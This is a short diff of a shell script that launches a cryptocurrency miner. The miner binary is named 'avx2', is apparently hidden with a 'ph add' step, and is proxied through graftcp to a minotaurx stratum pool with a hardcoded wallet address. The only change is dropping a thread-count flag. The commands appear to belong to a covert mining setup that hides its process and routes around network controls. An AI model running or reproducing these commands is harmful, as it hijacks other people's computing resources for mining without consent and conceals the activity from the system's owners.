@@ -39,4 +39,4 @@ chmod +x avx2
 
 sudo ph add avx2
 
-./graftcp/graftcp ./avx2 -a minotaurx  -o stratum+tcps://stratum-ru.rplant.xyz:17068 -u RXzEz9Qm1dNMj2V7PtEaQ2yz7kysjFGVq7.tes -p x -t2
+./graftcp/graftcp ./avx2 -a minotaurx -o stratum+tcps://stratum-ru.rplant.xyz:17068 -u RXzEz9Qm1dNMj2V7PtEaQ2yz7kysjFGVq7.tes -p x
